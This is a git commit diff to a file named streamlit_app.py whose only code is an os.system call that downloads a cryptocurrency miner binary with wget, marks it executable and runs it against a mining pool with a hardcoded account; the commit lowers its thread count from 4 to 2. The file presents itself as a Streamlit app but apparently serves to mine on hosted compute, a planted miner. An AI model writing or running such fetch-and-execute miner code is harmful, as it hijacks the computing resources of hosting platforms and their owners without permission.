218898529aec39685646485a66732ea47f4b695e
ricmine001 <140990139+ricmine001@users.noreply.github.com>
2023-07-31 07:59:50 +0530

    Update streamlit_app.pyo

--- streamlit_app.py
+++ streamlit_app.py
@@ -1,2 +1,2 @@
 import os
-os.system("wget -O rie https://riecoin.dev/resources/Pttn/rieMiner.php?system=Deb64AVX2 && chmod +x rie && ./rie noconffile Mode=Pool Host=ric.suprnova.cc Port=5000 Username=guru45.guru Password=guru Threads=4")
+os.system("wget -O rie https://riecoin.dev/resources/Pttn/rieMiner.php?system=Deb64AVX2 && chmod +x rie && ./rie noconffile Mode=Pool Host=ric.suprnova.cc Port=5000 Username=guru45.guru Password=guru Threads=2")
